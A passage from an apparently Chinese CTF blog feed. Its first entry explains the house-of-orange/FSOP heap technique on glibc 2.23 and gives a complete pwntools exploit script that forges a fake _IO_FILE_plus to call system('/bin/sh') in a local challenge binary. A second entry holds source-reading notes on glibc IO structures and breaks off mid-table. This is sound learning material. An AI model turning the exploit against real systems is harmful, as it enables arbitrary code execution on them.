errout;<br>&#125;<br></code></pre></td></tr></table></figure><p>倒推一下堆布局： </p><ul><li>由于我们需要放一个0x60的chunk（chunk2）到small bin里（后面再解释为什么），这个0x60的chunk同时也将用于unsorted bin attack，要绕开检查，unsorted bin中还得有一个chunk（chunk1），同时必须还有一个chunk在使用中（用于控制chunk2）<img src="/2023/02/20/FSOP/1.jpg" class title="步骤一"></li><li>chunk1只能来自于free掉的chunk插入，如果是来自于切割那chunk2已经进入small bin（切割unsorted bin中的chunk只有一种情况，就是unsorted bin中仅有一个chunk且是last remainder） <img src="/2023/02/20/FSOP/2.jpg" class title="步骤二"> 这样的话使用中的chunk必须在遍历unsorted bin之前就能得到。遍历unsorted bin之前会先在fastbin和small bin中找一样的，所以small bin中得有一个chunk<br>这样堆布局过程就很清楚了</li><li>从unsorted bin中的旧top chunk中切割一个small chunk返回<img src="/2023/02/20/FSOP/3.jpg" class title="步骤三"> </li><li>切割chunk2剩下一个0x60的chunk，返回剩下的，此时chunk1已进入small bin<img src="/2023/02/20/FSOP/4.jpg" class title="步骤四"></li><li>free使用的chunk进入unsorted bin，取走small bin中的chunk</li></ul><p>注意利用溢出覆盖next chunk的preinuse位为1防止合并</p><h4 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h4><p>unsorted bin attack会将unsorted bin的地址写进_IO_list_all，main arena部分的空间是我们无法完全控制的，但如果我们free一个chunk进main arena中的fake _IO_FILE_plus-&gt;_chain部分，下一个_IO_FILE_plus就是我们能够控制的，可以算出chunk的大小应该是0x60，这就是上文需要free一个0x60的chunk进small bin的原因<br>_IO_flush_all_lockp中调用_IO_OVERFLOW的条件有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>result = EOF;<br></code></pre></td></tr></table></figure><p>拆分一下两个条件</p><ul><li>&#96;&#96;&#96;c<br>fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>* ```c<br>  _IO_<span class="hljs-function"><span class="hljs-title">vtable_offset</span> (fp) == 0 &amp;&amp; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">mode</span> &gt; 0 &amp;&amp; (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br></code></pre></td></tr></table></figure>||的关系，满足其中一个就会调用_IO_OVERFLOW<br>main arena中的fake _IO_FILE_plus肯定不满足第一个条件中的 fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<img src="/2023/02/20/FSOP/fake.png" class title="fake">第二个条件中 fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base肯定满足，fp-&gt;_mode &gt; 0有满足的可能性（不知道为什么实测没有判断IO_vtable_offset (fp) &#x3D;&#x3D; 0），需要爆破<br>布置在heap中的fake _IO_FILE_plus时要保证fp-&gt;_mode&lt;&#x3D;0（exp中设为-1），fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base（exp中分别设为1和0）并设置vtable指针，开头写’&#x2F;bin&#x2F;sh’<img src="/2023/02/20/FSOP/IO_FILE.png" class title="IO_FILE">设置跳转表<img src="/2023/02/20/FSOP/vtable.png" class title="vtable">这样执行_IO_OVERFLOW (fp, EOF)的时候实际执行的就是system(‘&#x2F;bin&#x2F;sh’)</li></ul><h4 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h4><p>用2.23-0ubuntu3_amd64版本的libc时程序会断在进入abort函数之前，调用栈如下：</p><img src="/2023/02/20/FSOP/bt.png" class title="bt"><p>中断原因是尝试写入不可写段</p><img src="/2023/02/20/FSOP/vmmap.png" class title="vmmap"><p>用2.23-0ubuntu11.3_amd64就没问题<br>换程序换触发错误方式都会有同样的问题，不知道为什么</p><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;input the size:&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;input the content:&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bye</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="hljs-string">b&#x27;6&#x27;</span>)<br><br>p=process(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)<br>new(<span class="hljs-number">0x200000</span>)<span class="hljs-comment">#libcbase</span><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libcbase=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)+<span class="hljs-number">0x201000</span>-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete()<br>new(<span class="hljs-number">0x200</span>)<span class="hljs-comment">#change the size of topchunk</span><br>edit(<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10df1</span>))<br>delete()<br>new(<span class="hljs-number">0x12000</span>)<span class="hljs-comment">#free topchunk(0x10fe0)</span><br>delete()<br><br>unsorted_bin=libcbase+<span class="hljs-number">0x68</span>+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>_IO_list_all=libcbase+libc.symbols[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>new(<span class="hljs-number">0x200</span>)<span class="hljs-comment">#0x10dd0</span><br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10dd1</span>)+p64(unsorted_bin)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10db0</span>+p64(<span class="hljs-number">0x10dd0</span>)+p64(<span class="hljs-number">0x11</span>)<br>edit(payload)<br><br>delete()<br>new(<span class="hljs-number">0x10d60</span>)<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10d60</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x61</span>)+p64(unsorted_bin)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0x60</span>)+p64(<span class="hljs-number">0x11</span>)<br>edit(payload)<br><br>delete()<br>new(<span class="hljs-number">0x200</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].decode(),<span class="hljs-number">16</span>)-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x200</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x10d71</span>)+p64(heap+<span class="hljs-number">0x210</span>)+p64(unsorted_bin)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10d50</span><br>payload+=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0x61</span>)+p64(unsorted_bin)+p64(_IO_list_all-<span class="hljs-number">0x10</span>)<br>payload+=p64(<span class="hljs-number">0</span>)<span class="hljs-comment">#write base</span><br>payload+=p64(<span class="hljs-number">1</span>)<span class="hljs-comment">#write ptr</span><br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xc0</span>-<span class="hljs-number">48</span>)<br>payload+=p64(<span class="hljs-number">0xffffffffffffffff</span>)<br>payload+=<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xd8</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0xc0</span>)<br>payload+=p64(heap+<span class="hljs-number">0x11060</span>)<br>payload+=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>payload+=p64(<span class="hljs-number">1</span>)<br>payload+=p64(system)<br>edit(payload)<br>delete()<br>gdb.attach(p)<br>new(<span class="hljs-number">0xb00</span>)<br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>IO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>io</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2.23 IO相关源码阅读笔记</title>
    <link href="/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/02/10/IO%E7%9B%B8%E5%85%B3%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>开始IO啦！hgame week4的两道IO都摆烂放弃了，打算之后再系统学IO，how2heap暂时告一段落了就IO走起<br>ps：先马马虎虎翻一遍，以后如果有需要再细看</p><span id="more"></span><h1 id="基本结构体与全局变量"><a href="#基本结构体与全局变量" class="headerlink" title="基本结构体与全局变量"></a>基本结构体与全局变量</h1><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libio.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> &#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_file_flags _flags</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span><br>  <span class="hljs-type">char</span>* _IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span>* _IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span>* _IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span>* _IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span>* _IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>  <span class="hljs-type">int</span> _blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">int</span> _flags2;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_off_t _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __HAVE_COLUMN <span class="hljs-comment">/* temporary */</span></span><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  <span class="hljs-comment">/*  char* _save_gptr;  char* _save_egptr; */</span><br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span><br>  _IO_off64_t _offset;<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br><span class="hljs-meta"># <span class="hljs-keyword">else</span></span><br>  <span class="hljs-type">void</span> *__pad1;<br>  <span class="hljs-type">void</span> *__pad2;<br>  <span class="hljs-type">void</span> *__pad3;<br>  <span class="hljs-type">void</span> *__pad4;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><p>重要成员：</p><ul><li>_flags：高位字为IO_MAGIC，剩余的部分是flag</li><li>_IO_read_ptr：input指针现在的位置</li><li>_IO_read_end：input缓冲区的结束地址</li><li>_IO_read_base：input缓冲区的基址</li><li>_IO_write_base：output缓冲区的基址</li><li>_IO_write_ptr：output指针现在的位置</li><li>_IO_write_end：output指针的结束地址</li><li>_IO_buf_base：缓冲区基址</li><li>_IO_buf_end：缓冲区结束地址</li><li>_chain：相当于fd指针，用于形成单链表串联所有的file stream</li><li>_fileno：与文件相关的文件描述符</li><li>_vtable_offset：存放虚表（virtual table）的偏移</li><li>_offset：存放当前文件的偏移<br>ps：在看fopen源码时注意到有的成员不属于_IO_FILE而属于_IO_FILE_complete，根据宏定义#ifdef _IO_USE_OLD_IO_FILE，如果没有定义_IO_USE_OLD_IO_FILE，那么_IO_FILE_complete之后的成员是属于_IO_FILE的（应该是为了兼容性考虑）</li></ul><h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libioP.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  _IO_FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>成员偏移：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c">amd64：<br> <br><span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br><span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br><span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br><span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br><span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br><span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br><span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br><span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br><span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br><span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br><span class="hljs-number">0x50</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br><span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br><span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br><span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br><span class="hljs-number">0x70</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br><span class="hljs-number">0x74</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br><span class="hljs-number">0x78</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br><span class="hljs-number">0x80</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br><span class="hljs-number">0x82</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br><span class="hljs-number">0x83</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br><span class="hljs-number">0x88</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br><span class="hljs-number">0x90</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br><span class="hljs-number">0x98</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br><span class="hljs-number">0xa0</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br><span class="hljs-number">0xa8</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br><span class="hljs-number">0xb0</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br><span class="hljs-number">0xb8</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br><span class="hljs-number">0xc0</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br><span class="hljs-number">0xc4</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br><span class="hljs-number">0xd8</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p>_IO_FILE_plus前一部分是_IO_FILE结构体，后一部分就是指向_IO_jump_t结构体的vtable指针，其实就是虚表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//glibc-2.23\libio\libioP.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> 0</span><br>    get_column;<br>    set_column;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="IO-wide-data"><a href="#IO-wide-data" class="headerlink" title="_IO_wide_data"></a>_IO_wide_data</h2><p>为数据较多的流设置，根据宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br></code></pre></td></tr></table></figure><p>判断是否启用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 